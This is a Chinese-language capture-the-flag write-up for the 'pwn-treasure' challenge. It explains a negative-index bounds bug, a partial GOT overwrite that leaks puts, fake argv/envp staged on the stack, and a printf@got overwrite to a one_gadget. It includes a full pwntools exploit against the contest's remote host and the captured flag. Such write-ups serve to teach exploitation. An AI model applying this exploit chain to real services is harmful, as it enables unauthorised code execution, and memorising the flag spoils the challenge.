# pwn-treasure 题解

## 题目信息

- 题目：`pwn-treasure`
- 附件：`pwn-treasure`、`libc.so.6`
- 远程：`nc1.ctfplus.cn 41103`
- 最终 flag：`polarisctf{c16002fa-64de-4f70-9123-601118a5aa10}`

## 题目故事和出题意图

这题的故事其实就是一个“假密码，真后门”的设计。

程序开头会说：

- “我是这里的管家”
- “主人给系统留了密码，猜对就能操作系统”
- “你只有一次机会”

然后还会执行：

```c
system("echo password is !!.!!");
```

看起来像是在给玩家提示密码，但实际上这整段剧情都是在把人往“猜密码”这个方向带。

真正的判断逻辑是：

```c
if ( (void (*)())qword_48A8 == sub_1209 )
{
    system("/bin/sh");
}
```

也就是说，所谓“密码”并不是普通字符串，而是一个运行时函数地址。由于程序开启了 PIE，`sub_1209` 的实际地址每次运行都会变，正常情况下根本不可能盲猜。

所以这题的剧情反转其实很明确：

- 表面上：你要猜密码
- 实际上：作者故意给了一个几乎不可能直接走通的分支
- 真正正解：利用后面给出的“back door”，也就是两次任意位置修补

这也是为什么 `system("/bin/sh")` 会直接写在 `main` 里：

1. 它是最直接的奖励点，方便作者给出“猜中密码就 getshell”的剧情。
2. 它是一个很典型的误导点，让选手先意识到“这条路不现实，应该继续往后看漏洞”。
3. 这题核心逻辑都在 `main`，作者把“假正解”和“真漏洞”放在一起，选手读一遍 `main` 就能看出完整结构。

## 先做什么

这题最省时间的看法是：

1. 先看 `main`
2. 再看 `main` 里唯一的辅助输入函数 `sub_1214`
3. 最后确认 `.bss`、`.got.plt`、几个关键全局变量的相对位置

原因很简单：题目的所有逻辑几乎都在 `main` 里，辅助函数只负责读字符串。只要把 `main` 读明白，漏洞和利用路线基本就已经出来了。

---

## 基本保护

从 ELF 头和代码行为可以看出：

- 64 位 ELF
- PIE 开启
- Canary 开启
- NX 开启
- Partial RELRO

这里最重要的是 `Partial RELRO`，因为它意味着 `.got.plt` 仍然可写，后面才能打 `printf@got`。

虽然开了 PIE，但这题的核心不是“直接写绝对地址”，而是“从 `.bss` 基址按下标偏移写”。只要目标地址和 `.bss` 在同一个 PIE 映像里，二者的差值是固定的，所以 PIE 不会妨碍我们算负下标。

---

## 一、先看 `main`

反编译后的主逻辑如下：

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char v4[136]; // [rsp+0h] [rbp-90h] BYREF
  unsigned __int64 v5; // [rsp+88h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setbuf(stdout, 0LL);
  setbuf(stdin, 0LL);
  setbuf(stderr, 0LL);
  ...
  printf("password: ");
  __isoc99_scanf();
  if ( (void (*)())qword_48A8 == sub_1209 )
  {
    system("/bin/sh");
  }
  else
  {
    ...
    __isoc99_scanf();
    while ( qword_48A0 > 255 )
    {
      ...
      __isoc99_scanf();
    }
    read(0, &byte_40A0[8 * qword_48A0], 8uLL);
    printf("after your operation, the context: %s", &byte_40A0[8 * qword_48A0]);
    puts("you should tell me your name.");
    sub_1214(0LL, (__int64)v4, 127);
    v4[127] = 0;
    printf("have a fun time! right? %s", v4);
    puts("Last time!Lucky, guy!");
    __isoc99_scanf();
    while ( qword_48A0 > 255 )
    {
      ...
      __isoc99_scanf();
    }
    read(0, &byte_40A0[8 * qword_48A0], 8uLL);
    printf("after your operation, the context: %s", &byte_40A0[8 * qword_48A0]);
  }
  return 0LL;
}
```

这里有几个关键点：

### 1. 第一次输入是假的“密码门”

程序第一次读入后，把 `qword_48A8` 和 `sub_1209` 比较：

```c
if ( (void (*)())qword_48A8 == sub_1209 )
{
    system("/bin/sh");
}
```

看起来像是“输对密码直接 getshell”，但这里有个问题：

- `sub_1209` 在 PIE 程序里，运行时地址会随机化
- 用户只有一次输入机会
- 这之前没有任何泄漏

所以这条路本身并不适合作为正解，更像是个误导或者备用后门。

这里的 `system("/bin/sh")` 并不是说“题目真实解法就是直接跳这里”，而更像是作者放在 `main` 里的一个剧情锚点：

- 猜中密码就直接给 shell
- 但这个密码本质是 PIE 函数地址
- 所以你会很自然地意识到：真正要利用的是后面的 back door

### 2. 真正重要的是后面的两次“修位置”

失败后程序给了我们两次机会：

```c
read(0, &byte_40A0[8 * qword_48A0], 8uLL);
printf("after your operation, the context: %s", &byte_40A0[8 * qword_48A0]);
```

这说明我们有两次能力：

- 自选下标
- 向 `byte_40A0 + 8 * idx` 写最多 8 字节
- 然后把这个位置当成 `%s` 打印出来

这已经非常像“任意地址写 + 任意地址读”的组合题了。

### 3. 负下标居然没拦

这题真正的 bug 在这里：

```c
while ( qword_48A0 > 255 )
```

它只检查了“不能大于 255”，却**没有检查不能小于 0**。

而第二次、第三次下标输入的格式串是 `%lld`，也就是有符号整数。

所以：

- `0 ~ 255`：正常写到 `.bss` 数组内部
- `< 0`：往 `.bss` 之前的区域写

而 `.bss` 前面正好就是：

- `.data`
- `.got`
- `.got.plt`

于是负下标就变成了“写 GOT”的入口。

---

## 二、再看 `sub_1214`

辅助函数如下：

```c
unsigned __int64 __fastcall sub_1214(__int64 a1, __int64 a2, int a3)
{
  unsigned int i;

  for ( i = 0; ; ++i )
  {
    if ( (int)i >= a3 )
      break;
    read(0, (void *)((int)i + a2), 1uLL);
    if ( *(_BYTE *)((int)i + a2) == 10 || *(_BYTE *)((int)i + a2) == 32 )
    {
      *(_BYTE *)((int)i + a2) = 0;
      return ...;
    }
  }
}
```

这个函数的特点是：

- 一次读 1 字节
- 遇到 `\n` 或空格就截断
- **不会拦截 `\x00`**

这点对利用非常重要，因为后面我们要在 `name` 缓冲区里手工布置：

- 指向 `"/bin/sh"` 的指针
- `NULL`
- `envp = NULL`

如果函数不允许输入 `\x00`，这个思路就麻烦很多；但这里是允许的，所以 fake `argv/envp` 很好构造。

---

## 三、把内存布局想清楚

这题的关键偏移如下：

- `.bss` 起点：`0x40a0`
- `puts@got`：`0x4018`
- `printf@got`：`0x4038`

因为程序的写入地址是：

```c
&byte_40A0[8 * idx]
```

所以只要算：

```text
idx = (target - 0x40a0) / 8
```

就能写到任意目标。

### 1. 泄漏 `puts@got`

```text
(0x4018 - 0x40a0) / 8 = -0x88 / 8 = -17
```

所以第一次写时输入：

```text
-17
```

### 2. 覆写 `printf@got`

```text
(0x4038 - 0x40a0) / 8 = -0x68 / 8 = -13
```

所以第二次写时输入：

```text
-13
```

注意这里虽然 PIE 开启，但偏移差值不变，所以 `-17` 和 `-13` 在本地、远程都成立。

---

## 四、漏洞点到底是什么

这题其实不是单一漏洞，而是三个点组合起来形成完整利用链：

### 漏洞 1：有符号整数边界检查错误

程序使用 `%lld` 读入下标，但只校验：

```c
idx <= 255
```

没有校验：

```c
idx >= 0
```

于是负下标成立，得到基于 `.bss` 的越界写。

### 漏洞 2：`read(..., 8)` 的返回值没检查

程序想读 8 字节：

```c
read(0, target, 8);
```

但它没有检查 `read` 到底返回了几字节。

在套接字场景下，如果我们只发 1 字节，`read` 完全可能提前返回 1，而不是等满 8 字节。

于是我们就有了一个很舒服的**部分覆写**原语。

### 漏洞 3：把任意地址当 `%s` 打印

写完之后立刻：

```c
printf("after your operation, the context: %s", target);
```

这相当于把我们选中的地址当成字符串起点一直打印到 `\x00`。

如果目标是 GOT 表项，那么 `%s` 会把真实函数地址当字节流吐出来，直接形成泄漏。

---

## 五、利用思路

最终利用路线是：

1. 用负下标定位到 `puts@got`
2. 只写 1 个字节，保留 GOT 项其余内容不变
3. 利用后面的 `%s` 打印泄漏 `puts` 真实地址
4. 算出 libc 基址
5. 在 `name` 栈缓冲区中布置 fake `argv` 和 `envp`
6. 第二次负下标定位到 `printf@got`
7. 把 `printf@got` 改成 one_gadget
8. 程序最后一次再调用 `printf(...)` 时，直接跳进 gadget，执行 `execve("/bin/sh", ...)`

---

## 六、第一步：为什么可以稳定泄漏 `puts`

第一次我们打 `puts@got`，也就是下标 `-17`。

脚本里这样做：

```python
io.sendlineafter(b"Which one?\n", b"-17")
io.send(p8(libc.sym["puts"] & 0xff))
```

这里不是随便写 1 字节，而是写成 `puts` 地址本来就应该有的最低字节。

远程附件 libc 中：

- `puts` 偏移低字节正好是 `0x50`

所以我们只发 1 字节 `0x50`，效果是：

- GOT 项本质上没被破坏
- 但 `read` 已经返回
- 紧接着程序执行 `%s` 打印

打印出来的内容就是 GOT 里的真实函数指针，例如远程实测：

```text
puts leak = 0x7f4e6a556e50
libc base = 0x7f4e6a4d6000
```

于是：

```python
libc_base = leak - libc.sym["puts"]
```

---

## 七、第二步：为什么要利用 `name` 缓冲区

`name` 在栈上：

```c
char v4[136]; // [rbp-0x90]
```

也就是说，`name` 缓冲区是 `main` 栈帧里的一个局部变量，起始位置就是：

```text
rbp-0x90
```

这是整个利用链里非常关键的一块内存，因为我们最终选用的 one_gadget 不是“无条件弹 shell”，而是需要从当前栈上取 `argv` 和 `envp`。

而远程最终使用的 one_gadget 是附件 libc 里的：

```text
0xebd43 execve("/bin/sh", rbp-0x50, [rbp-0x70])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {rax, [rbp-0x48], NULL} is a valid argv
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL || [rbp-0x70] is a valid envp
```

这个 gadget 的优点是：

- `argv` 取自 `rbp-0x50`
- `envp` 取自 `[rbp-0x70]`

而这两块位置都落在 `v4` 这个名字缓冲区内部，所以可以直接伪造。

### 栈上对应关系

`v4` 从 `rbp-0x90` 开始，所以：

- `rbp-0x78` 对应 `v4 + 0x18`
- `rbp-0x70` 对应 `v4 + 0x20`
- `rbp-0x50` 对应 `v4 + 0x40`
- `rbp-0x48` 对应 `v4 + 0x48`

于是我们构造：

```python
def build_name_payload(binsh: int) -> bytes:
    data = bytearray(b"A" * 0x50)
    data[0x18:0x20] = p64(0)
    data[0x20:0x28] = p64(0)
    data[0x40:0x48] = p64(binsh)
    data[0x48:0x50] = p64(0)
    return bytes(data)
```

对应语义就是：

- `[rbp-0x70] = 0`，即 `envp = NULL`
- `[rbp-0x50] = libc_base + binsh`，即 `argv[0] = "/bin/sh"`
- `[rbp-0x48] = 0`，即 `argv[1] = NULL`

最后让 `sub_1214` 读入这段二进制内容即可。

### 为什么一定要布置 `name`

因为这个 gadget 真正执行的是：

```text
execve("/bin/sh", rbp-0x50, [rbp-0x70])
```

也就是说，gadget 不是帮你自动把参数准备好，它只是“假设这些参数已经在栈上摆好了”，然后直接调用 `execve`。

所以我们必须提前利用 `name` 缓冲区做这件事：

- 把 `rbp-0x50` 位置布置成一个合法的 `argv`
- 把 `[rbp-0x70]` 布置成 `NULL`，让 `envp` 合法

如果不这样做，会出现两种常见后果：

1. `argv/envp` 读到栈垃圾，`execve` 参数非法，调用失败。
2. gadget 访问到无效指针，程序直接崩溃。

所以这题里三块内容是分工明确的：

- 第一次负下标写：负责泄漏 libc
- `name` 缓冲区：负责给 gadget 准备参数
- 第二次负下标写：负责把控制流劫持到 gadget

如果只做最后一步，不提前布置 `name`，大概率就是远程直接断开或者本地 `SIGSEGV`。

---

## 八、第三步：为什么覆写 `printf@got`

第二次任意写之后，程序马上执行：

```c
printf("after your operation, the context: %s", target);
```

所以最自然的控制流劫持点就是：

- 把 `printf@got` 改成 one_gadget
- 然后等程序自己再调用一次 `printf`

这一步的下标是：

```text
(0x4038 - 0x40a0) / 8 = -13
```

所以脚本中：

```python
io.sendlineafter(b"Last time!Lucky, guy!\n", b"-13")
io.send(p64(libc_base + 0xebd43))
```

然后程序本来要走：

```c
printf("after your operation, the context: %s", ...)
```

但因为 GOT 已经被改掉了，实际就跳进：

```text
libc_base + 0xebd43
```

从而执行：

```text
execve("/bin/sh", rbp-0x50, [rbp-0x70])
```

而这两个参数我们刚才已经在 `name` 缓冲区里布置好了。

---

## 九、完整利用流程

按做题顺序，完整过程是：

### 1. 输入任意错误密码

比如输入：

```text
0
```

让程序进入“修位置”分支。

### 2. 第一次选择位置，输入 `-17`

目标是 `puts@got`。

### 3. 第一次写入，只发 1 字节

发：

```python
p8(libc.sym["puts"] & 0xff)
```

借 `%s` 打印泄漏 `puts` 实际地址。

### 4. 计算 libc 基址

```python
libc_base = leaked_puts - libc.sym["puts"]
```

### 5. 输入名字，布置 fake `argv/envp`

把下面这段结构塞进栈上：

```text
rbp-0x70 -> NULL
rbp-0x50 -> "/bin/sh"
rbp-0x48 -> NULL
```

### 6. 第二次选择位置，输入 `-13`

目标是 `printf@got`。

### 7. 第二次写入 one_gadget

写：

```python
p64(libc_base + 0xebd43)
```

### 8. 程序最后一次调用 `printf`

因为 GOT 已经被改掉，实际跳入 one_gadget，执行：

```text
execve("/bin/sh", rbp-0x50, [rbp-0x70])
```

成功 getshell。

### 9. 读取 flag

远程环境比较瘦，实测有两个坑：

- `id` 不在 PATH
- `2>/dev/null` 这种重定向还会报 `Permission denied`

所以最稳的是直接发绝对路径命令：

```sh
/bin/cat ./flag
```

最终得到：

```text
polarisctf{c16002fa-64de-4f70-9123-601118a5aa10}
```

---

## 十、EXP

完整脚本见：

- [solve.py](C:\Users\WYH\Desktop\polarisctf招新赛\pwn\pwn-treasure\attachments\solve.py)

核心 EXP 如下：

```python
from pwn import *

context(arch='amd64', os='linux', log_level='debug')

elf = ELF('./pwn-treasure')
libc = ELF('./libc.so.6')

BASE_BSS = 0x40A0
HOST = "nc1.ctfplus.cn"
PORT = 41103
GADGET = 0xEBD43

def idx(addr: int) -> int:
    return (addr - BASE_BSS) // 8

def start():
    if args.REMOTE:
        io = remote(HOST, PORT)
    else:
        io = process('./pwn-treasure')
    return io

def leak_puts(io):
    io.sendlineafter(b'password: ', b'0')
    io.sendlineafter(b'Which one?\n', str(idx(elf.got['puts'])).encode())

    # gdb.attach(io, 'b *main\nc')
    # pause()
    io.send(p8(libc.sym['puts'] & 0xff))

    io.recvuntil(b'after your operation, the context: ')
    puts_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
    io.recvuntil(b'you should tell me your name.\n')
    return puts_addr

def build_name_payload(libc_base):
    payload = flat(
        {
            0x18: 0,
            0x20: 0,
            0x40: libc_base + next(libc.search(b'/bin/sh\x00')),
            0x48: 0,
        },
        filler=b'A',
        length=0x50,
    )
    return payload

def main():
    io = start()
    puts_addr = leak_puts(io)
    libc_base = puts_addr - libc.sym['puts']

    payload = build_name_payload(libc_base)
    io.send(payload + b'\n')
    io.sendlineafter(b'Last time!Lucky, guy!\n', str(idx(elf.got['printf'])).encode())

    # gdb.attach(io, 'b *main\nc')
    # pause()
    io.send(p64(libc_base + GADGET))

    io.interactive()

if __name__ == "__main__":
    main()
```

远程使用：

```bash
python3 solve.py REMOTE=1
```

---

## 十一、这题的核心收获

这题最值得记住的是三个点：

1. `idx > 255` 这种检查经常会漏掉负数，下标题第一反应一定要看“有没有下界”。
2. `read(fd, buf, 8)` 如果不检查返回值，很多时候就不是“固定 8 字节写”，而是“可控长度写”。
3. 任意地址写后面如果紧跟一个 `%s` 打印，经常能把“写原语”升级成“泄漏 + 劫持”一条龙。

这题本质上就是：

- 负下标拿写原语
- 短读拿部分覆写
- `%s` 打印拿泄漏
- Partial RELRO 打 GOT
- one_gadget 借栈缓冲区伪造参数

整条链子非常经典，也很适合练“从主逻辑里快速提炼利用面”。

如果再从题目故事层面总结一句，这题讲的其实就是：

- “猜密码”只是表面剧情
- `system("/bin/sh")` 是作者故意摆在 `main` 里的诱饵和奖励点
- 真正把题打通的，不是猜中密码，而是利用作者自己留给你的 back door
